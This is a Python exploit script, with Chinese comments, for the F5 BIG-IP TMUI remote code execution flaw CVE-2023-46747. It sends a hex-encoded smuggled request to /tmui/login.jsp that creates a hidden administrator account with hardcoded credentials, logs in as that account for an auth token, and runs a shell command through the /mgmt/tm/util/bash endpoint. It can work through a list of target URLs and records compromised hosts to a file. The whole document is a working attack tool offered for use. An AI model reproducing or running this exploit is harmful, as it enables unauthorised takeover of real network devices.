# 作者: VulnExpo
# 日期: 2023-10-31

import requests
import argparse
import binascii
import json
import time
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_for_vulnerability(url, username, password, success_file=None):
    def send_login_request(url):
        # 构建第一个请求体
        request_hex = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d684e573153266e616d655f6265666f72653d267061737377643d6b616c643141396f316e49486179267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"
        request_body = binascii.unhexlify(request_hex)
        data = b"204\r\n" + request_body + b"\r\n0\r\n\r\n"
        headers = {
            # "Host": hostname,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        response_login = requests.post(f"{url}/tmui/login.jsp", data=data, headers=headers, verify=False)

        return response_login

    def send_authn_request(url, username, password):
        # 构建第二个请求体
        authn_data = {
            "username": username,
            "password": password,
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Length": "51",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip",
        }

        try:
            response_authn = requests.post(f"{url}/mgmt/shared/authn/login", json=authn_data, headers=headers, verify=False)
            if response_authn.status_code == 200:
                response_json = response_authn.json()
                token = response_json.get("token", {}).get("token")
                return token
            else:
                print(f"请求失败，状态码: {response_authn.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"请求错误: {e}")
        except json.JSONDecodeError as e:
            print(f"JSON解析错误: {e}")
        return None

    def send_bash_request(url, token):
        for retry in range(3):  # 尝试三次
            if token is None:
                return None

            bash_data = {
                "command": "run",
                "utilCmdArgs": "-c id",
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
                "Connection": "close",
                "Content-Length": "41",
                "Content-Type": "application/json",
                "X-F5-Auth-Token": token,
                "Accept-Encoding": "gzip",
            }

            response_bash = requests.post(f"{url}/mgmt/tm/util/bash", json=bash_data, headers=headers, verify=False)

            if response_bash.status_code == 200:
                try:
                    response_json = response_bash.json()
                    command_result = response_json.get("commandResult", "No commandResult found")
                    return command_result
                except json.JSONDecodeError as e:
                    print(f"JSON解析错误: {e}")
                    return None
            elif response_bash.status_code == 401:
                print(f"第 {retry+1} 次尝试：状态码 401，等待1秒后重试...")
                time.sleep(1)
            else:
                print(f"第 {retry+1} 次尝试：请求失败，状态码: {response_bash.status_code}")
                return None

        print("已达到最大重试次数，放弃。")
        return None

    response_login = send_login_request(url)
    if response_login.status_code == 200:
        response_authn = send_authn_request(url, username, password)
        token = send_authn_request(url, username, password)
        response_bash = send_bash_request(url, token)
        command_result = send_bash_request(url, token)
        if command_result is not None:  # 检查结果是否不为 None
            with open(success_file, 'a') as s_file:
                s_file.write(f"++++++++++++++++++\n")
                s_file.write(f"目标URL: {url}\n")
                s_file.write(f"Command Result: {command_result}\n\n")
            print(f"目标URL: {url}")
            print(f"Command Result: {command_result}")

def scan_targets(targets, username, password, success_file=None):
    for target in targets:
        target = target.strip()
        check_for_vulnerability(target, username, password, success_file)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="F5 BIG-IP TMUI 远程代码执行漏洞CVE-2023-46747")
    parser.add_argument("-u", "--url", help="目标URL")
    parser.add_argument("-f", "--file", default="url.txt", help="目标URL列表，默认为url.txt")
    args = parser.parse_args()

    if not args.url and not args.file:
        print("请使用 -u 指定要扫描的目标URL或使用默认文件 url.txt。")
        exit(1)

    if args.url:
        urls = [args.url]
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.readlines()

    success_file = 'success_targets.txt'
    username = "hNW1S"
    password = "kald1A9o1nIHay"

    for url in urls:
        url = url.strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
        scan_targets([url], username, password, success_file)

    print("扫描完成，成功的目标已保存到 success_targets.txt 文件中。")
